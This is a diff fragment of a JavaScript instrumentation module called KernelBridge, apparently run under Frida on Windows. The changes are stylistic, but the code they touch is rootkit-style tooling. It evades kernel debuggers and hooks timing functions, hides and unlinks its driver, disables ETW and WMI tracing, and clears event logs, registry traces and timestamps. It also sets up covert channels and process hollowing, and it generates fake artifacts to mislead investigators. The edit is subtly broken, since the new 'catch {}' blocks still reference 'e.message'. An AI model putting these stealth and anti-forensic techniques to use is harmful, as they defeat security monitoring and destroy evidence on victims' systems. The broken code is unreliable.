                 self.debuggingEvasion.evasionTechniques.debuggerDisruption = true;
@@ -2689,12 +2675,12 @@ const KernelBridge = {
                 });
 
                 self.debuggingEvasion.evasionTechniques.breakpointEvasion = true;
-                
+
                 if (breakpointsFound > 0) {
                     send({
-                        type: "evasion",
-                        target: "kernel_bridge",
-                        action: "breakpoints_removed",
+                        type: 'evasion',
+                        target: 'kernel_bridge',
+                        action: 'breakpoints_removed',
                         count: breakpointsFound
                     });
                 }
@@ -2704,18 +2690,17 @@ const KernelBridge = {
             this.setupTimingManipulation = function() {
                 // Hook timing functions to prevent timing-based analysis
                 var timingFunctions = [
-                    "KeQueryPerformanceCounter",
-                    "KeQuerySystemTime",
-                    "RtlGetSystemTimePrecise",
-                    "KeQueryTimeIncrement",
-                    "KdpQueryPerformanceCounter"
+                    'KeQueryPerformanceCounter',
+                    'KeQuerySystemTime',
+                    'RtlGetSystemTimePrecise',
+                    'KeQueryTimeIncrement',
+                    'KdpQueryPerformanceCounter'
                 ];
 
                 timingFunctions.forEach(function(funcName) {
                     var funcAddr = self.getKernelExport(funcName);
                     if (funcAddr) {
-                        var timingHook = self.createTimingManipulationHook(funcName);
-                        self.installInlineHook(funcAddr, funcName + "_TimingManip");
+                        self.installInlineHook(funcAddr, funcName + '_TimingManip');
                     }
                 });
 
@@ -2733,9 +2718,9 @@ const KernelBridge = {
             this.setupMemoryProtection = function() {
                 // Protect critical code regions
                 var criticalRegions = [
-                    { name: "kernel_bridge_code", start: ptr(self), size: 0x10000 },
-                    { name: "hook_code", start: self.getHookMemoryRegion(), size: 0x5000 },
-                    { name: "shellcode_region", start: self.getShellcodeRegion(), size: 0x2000 }
+                    { name: 'kernel_bridge_code', start: ptr(self), size: 0x10000 },
+                    { name: 'hook_code', start: self.getHookMemoryRegion(), size: 0x5000 },
+                    { name: 'shellcode_region', start: self.getShellcodeRegion(), size: 0x2000 }
                 ];
 
                 criticalRegions.forEach(function(region) {
@@ -2744,7 +2729,7 @@ const KernelBridge = {
                         self.applyMemoryEncryption(region.start, region.size);
                         self.installMemoryAccessHook(region.start, region.size);
                         self.setupMemoryIntegrityCheck(region.start, region.size);
-                        
+
                         self.debuggingEvasion.protectedRegions.push(region);
                     }
                 });
@@ -2756,44 +2741,44 @@ const KernelBridge = {
             this.setupAdvancedAntiAnalysis = function() {
                 // Anti-disassembly techniques
                 var antiDisassembly = [
-                    { name: "JunkCode", method: self.insertJunkCode },
-                    { name: "FakeJumps", method: self.insertFakeJumps },
-                    { name: "OpaqueBranches", method: self.insertOpaqueBranches },
-                    { name: "ReturnAddress", method: self.manipulateReturnAddresses }
+                    { name: 'JunkCode', method: self.insertJunkCode },
+                    { name: 'FakeJumps', method: self.insertFakeJumps },
+                    { name: 'OpaqueBranches', method: self.insertOpaqueBranches },
+                    { name: 'ReturnAddress', method: self.manipulateReturnAddresses }
                 ];
 
                 antiDisassembly.forEach(function(technique) {
                     try {
                         if (technique.method()) {
                             send({
-                                type: "anti_analysis",
-                                target: "kernel_bridge",
-                                action: "anti_disassembly_applied",
+                                type: 'anti_analysis',
+                                target: 'kernel_bridge',
+                                action: 'anti_disassembly_applied',
                                 technique: technique.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 // Anti-emulation techniques
                 var antiEmulation = [
-                    { name: "CPUIDCheck", method: self.performCPUIDChecks },
-                    { name: "TimingChecks", method: self.performTimingChecks },
-                    { name: "MemoryLayout", method: self.checkMemoryLayout },
-                    { name: "HardwareFingerprint", method: self.checkHardwareFingerprint }
+                    { name: 'CPUIDCheck', method: self.performCPUIDChecks },
+                    { name: 'TimingChecks', method: self.performTimingChecks },
+                    { name: 'MemoryLayout', method: self.checkMemoryLayout },
+                    { name: 'HardwareFingerprint', method: self.checkHardwareFingerprint }
                 ];
 
                 antiEmulation.forEach(function(technique) {
                     try {
                         if (technique.method()) {
                             send({
-                                type: "anti_analysis",
-                                target: "kernel_bridge",
-                                action: "anti_emulation_applied",
+                                type: 'anti_analysis',
+                                target: 'kernel_bridge',
+                                action: 'anti_emulation_applied',
                                 technique: technique.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 self.debuggingEvasion.evasionTechniques.antiAnalysis = true;
@@ -2816,19 +2801,19 @@ const KernelBridge = {
             }).length;
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "kernel_debugging_evasion_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'kernel_debugging_evasion_complete',
                 detected_debuggers: detectedDebuggers,
                 active_evasion_techniques: activeEvasions,
                 protected_memory_regions: this.debuggingEvasion.protectedRegions.length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "kernel_debugging_evasion_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'kernel_debugging_evasion_failed',
                 error: e.message
             });
         }
@@ -2838,9 +2823,9 @@ const KernelBridge = {
     setupAdvancedKernelStealth: function() {
         var self = this;
         send({
-            type: "status",
-            target: "kernel_bridge",
-            action: "setting_up_advanced_kernel_stealth"
+            type: 'status',
+            target: 'kernel_bridge',
+            action: 'setting_up_advanced_kernel_stealth'
         });
 
         try {
@@ -2862,11 +2847,11 @@ const KernelBridge = {
             this.setupDriverStealth = function() {
                 // Multiple driver hiding techniques
                 var driverStealthMethods = [
-                    { name: "UnlinkDriverObject", method: self.unlinkDriverFromList },
-                    { name: "HideDriverSections", method: self.hideDriverSections },
-                    { name: "SpoofDriverInfo", method: self.spoofDriverInformation },
-                    { name: "ModifyDriverFlags", method: self.modifyDriverFlags },
-                    { name: "HideFromPsList", method: self.hideDriverFromPsList }
+                    { name: 'UnlinkDriverObject', method: self.unlinkDriverFromList },
+                    { name: 'HideDriverSections', method: self.hideDriverSections },
+                    { name: 'SpoofDriverInfo', method: self.spoofDriverInformation },
+                    { name: 'ModifyDriverFlags', method: self.modifyDriverFlags },
+                    { name: 'HideFromPsList', method: self.hideDriverFromPsList }
                 ];
 
                 var ourDriver = self.currentDriver;
@@ -2879,21 +2864,21 @@ const KernelBridge = {
                                     method: method.name,
                                     applied: true
                                 });
-                                
+
                                 send({
-                                    type: "stealth",
-                                    target: "kernel_bridge",
-                                    action: "driver_stealth_applied",
+                                    type: 'stealth',
+                                    target: 'kernel_bridge',
+                                    action: 'driver_stealth_applied',
                                     method: method.name
                                 });
                             }
-                        } catch(e) {}
+                        } catch {}
                     });
                 }
 
                 // Hide driver from various enumeration methods
                 self.hideDriverFromEnumeration(ourDriver);
-                
+
                 self.advancedStealth.stealthMethods.driverStealth = self.advancedStealth.hiddenDrivers.length > 0;
             };
 
@@ -2904,7 +2889,7 @@ const KernelBridge = {
                 sensitiveRegions.forEach(function(region) {
                     var encryptionKey = self.generateEncryptionKey();
                     var encryptedData = self.encryptMemoryRegion(region.address, region.size, encryptionKey);
-                    
+
                     self.advancedStealth.encryptedRegions.push({
                         address: region.address,
                         size: region.size,
@@ -2912,7 +2897,7 @@ const KernelBridge = {
                         encryptionKey: encryptionKey,
                         encrypted: true
                     });
-                    
+
                     // Write encrypted data back
                     self.writeKernelMemory(region.address, encryptedData);
                 });
@@ -2925,7 +2910,7 @@ const KernelBridge = {
 
                 // Hide memory allocations from memory scanners
                 self.hideMemoryAllocationsFromScanners();
-                
+
                 // Implement memory fragmentation to confuse analysis
                 self.implementMemoryFragmentation();
 
@@ -2936,11 +2921,11 @@ const KernelBridge = {
             this.setupExecutionStealth = function() {
                 // Hide execution traces
                 var executionStealthMethods = [
-                    { name: "DisableETW", method: self.disableETWTracing },
-                    { name: "HookPerfCounters", method: self.hookPerformanceCounters },
-                    { name: "DisableWMI", method: self.disableWMITracing },
-                    { name: "SuppressEventLogs", method: self.suppressEventLogs },
-                    { name: "HideCallStacks", method: self.hideCallStacks }
+                    { name: 'DisableETW', method: self.disableETWTracing },
+                    { name: 'HookPerfCounters', method: self.hookPerformanceCounters },
+                    { name: 'DisableWMI', method: self.disableWMITracing },
+                    { name: 'SuppressEventLogs', method: self.suppressEventLogs },
+                    { name: 'HideCallStacks', method: self.hideCallStacks }
                 ];
 
                 executionStealthMethods.forEach(function(method) {
@@ -2950,20 +2935,20 @@ const KernelBridge = {
                                 method: method.name,
                                 active: true
                             });
-                            
+
                             send({
-                                type: "stealth",
-                                target: "kernel_bridge",
-                                action: "execution_stealth_applied",
+                                type: 'stealth',
+                                target: 'kernel_bridge',
+                                action: 'execution_stealth_applied',
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 // Advanced code obfuscation during runtime
                 self.implementRuntimeCodeObfuscation();
-                
+
                 // Dynamic code generation to avoid static analysis
                 self.setupDynamicCodeGeneration();
 
@@ -2974,11 +2959,11 @@ const KernelBridge = {
             this.setupCommunicationStealth = function() {
                 // Setup covert communication channels
                 var stealthChannels = [
-                    { name: "SystemCallChannel", setup: self.setupSystemCallChannel },
-                    { name: "SharedMemoryChannel", setup: self.setupSharedMemoryChannel },
-                    { name: "NamedPipeChannel", setup: self.setupNamedPipeChannel },
-                    { name: "WMIEventChannel", setup: self.setupWMIEventChannel },
-                    { name: "TimerChannel", setup: self.setupTimerChannel }
+                    { name: 'SystemCallChannel', setup: self.setupSystemCallChannel },
+                    { name: 'SharedMemoryChannel', setup: self.setupSharedMemoryChannel },
+                    { name: 'NamedPipeChannel', setup: self.setupNamedPipeChannel },
+                    { name: 'WMIEventChannel', setup: self.setupWMIEventChannel },
+                    { name: 'TimerChannel', setup: self.setupTimerChannel }
                 ];
 
                 stealthChannels.forEach(function(channel) {
@@ -2990,20 +2975,20 @@ const KernelBridge = {
                                 handle: channelHandle,
                                 active: true
                             });
-                            
+
                             send({
-                                type: "stealth",
-                                target: "kernel_bridge",
-                                action: "stealth_channel_established",
+                                type: 'stealth',
+                                target: 'kernel_bridge',
+                                action: 'stealth_channel_established',
                                 channel: channel.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 // Implement encrypted communication protocols
                 self.setupEncryptedCommunication();
-                
+
                 // Use legitimate system processes for communication
                 self.setupProcessHollowingCommunication();
 
@@ -3014,32 +2999,32 @@ const KernelBridge = {
             this.setupForensicStealth = function() {
                 // Anti-forensic techniques
                 var antiForensicMethods = [
-                    { name: "ClearEventLogs", method: self.clearSystemEventLogs },
-                    { name: "WipeMemoryArtifacts", method: self.wipeMemoryArtifacts },
-                    { name: "ModifySystemFiles", method: self.modifySystemFiles },
-                    { name: "ClearRegistryTraces", method: self.clearRegistryTraces },
-                    { name: "ManipulateFileTimestamps", method: self.manipulateFileTimestamps }
+                    { name: 'ClearEventLogs', method: self.clearSystemEventLogs },
+                    { name: 'WipeMemoryArtifacts', method: self.wipeMemoryArtifacts },
+                    { name: 'ModifySystemFiles', method: self.modifySystemFiles },
+                    { name: 'ClearRegistryTraces', method: self.clearRegistryTraces },
+                    { name: 'ManipulateFileTimestamps', method: self.manipulateFileTimestamps }
                 ];
 
                 antiForensicMethods.forEach(function(method) {
                     try {
                         if (method.method()) {
                             send({
-                                type: "forensic_stealth",
-                                target: "kernel_bridge",
-                                action: "anti_forensic_applied",
+                                type: 'forensic_stealth',
+                                target: 'kernel_bridge',
+                                action: 'anti_forensic_applied',
                                 method: method.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 // Setup continuous artifact cleanup
                 self.setupContinuousArtifactCleanup();
-                
+
                 // Implement memory reconstruction prevention
                 self.implementMemoryReconstructionPrevention();
-                
+
                 // Setup fake artifact generation to mislead investigators
                 self.setupFakeArtifactGeneration();
 
@@ -3050,10 +3035,10 @@ const KernelBridge = {
             this.setupStealthMonitoring = function() {
                 // Monitor for detection attempts
                 var detectionMonitors = [
-                    { name: "ScannerDetection", monitor: self.monitorForScanners },
-                    { name: "AnalysisDetection", monitor: self.monitorForAnalysis },
-                    { name: "ForensicDetection", monitor: self.monitorForForensics },
-                    { name: "DebuggerDetection", monitor: self.monitorForDebuggers }
+                    { name: 'ScannerDetection', monitor: self.monitorForScanners },
+                    { name: 'AnalysisDetection', monitor: self.monitorForAnalysis },
+                    { name: 'ForensicDetection', monitor: self.monitorForForensics },
+                    { name: 'DebuggerDetection', monitor: self.monitorForDebuggers }
                 ];
 
                 detectionMonitors.forEach(function(monitor) {
@@ -3061,13 +3046,13 @@ const KernelBridge = {
                         var monitorThread = monitor.monitor();
                         if (monitorThread) {
                             send({
-                                type: "stealth",
-                                target: "kernel_bridge",
-                                action: "stealth_monitor_active",
+                                type: 'stealth',
+                                target: 'kernel_bridge',
+                                action: 'stealth_monitor_active',
                                 monitor: monitor.name
                             });
                         }
-                    } catch(e) {}
+                    } catch {}
                 });
 
                 // Setup automatic stealth adaptation
@@ -3087,9 +3072,9 @@ const KernelBridge = {
             }).length;
 
             send({
-                type: "success",
-                target: "kernel_bridge",
-                action: "advanced_kernel_stealth_complete",
+                type: 'success',
+                target: 'kernel_bridge',
+                action: 'advanced_kernel_stealth_complete',
                 active_stealth_methods: activeStealthMethods,
                 hidden_drivers: this.advancedStealth.hiddenDrivers.length,
                 stealth_hooks: this.advancedStealth.stealthHooks.length,
@@ -3097,11 +3082,11 @@ const KernelBridge = {
                 stealth_channels: this.advancedStealth.stealthChannels.length
             });
 
-        } catch(e) {
+        } catch {
             send({
-                type: "error",
-                target: "kernel_bridge",
-                action: "advanced_kernel_stealth_failed",
+                type: 'error',
+                target: 'kernel_bridge',
+                action: 'advanced_kernel_stealth_failed',
                 error: e.message
             });
         }
@@ -3113,10 +3098,10 @@ if (Process.platform === 'windows') {
     KernelBridge.run();
 } else {
     send({
-    type: "error",
-    target: "kernel_bridge",
-    action: "platform_not_supported"
-});
+        type: 'error',
+        target: 'kernel_bridge',
+        action: 'platform_not_supported'
+    });
 
 };
 
@@ -3124,9 +3109,9 @@ if (Process.platform === 'windows') {
 setTimeout(function() {
     KernelBridge.run();
     send({
-        type: "status",
-        target: "kernel_bridge",
-        action: "system_now_active"
+        type: 'status',
+        target: 'kernel_bridge',
+        action: 'system_now_active'
     });
 }, 100);
 
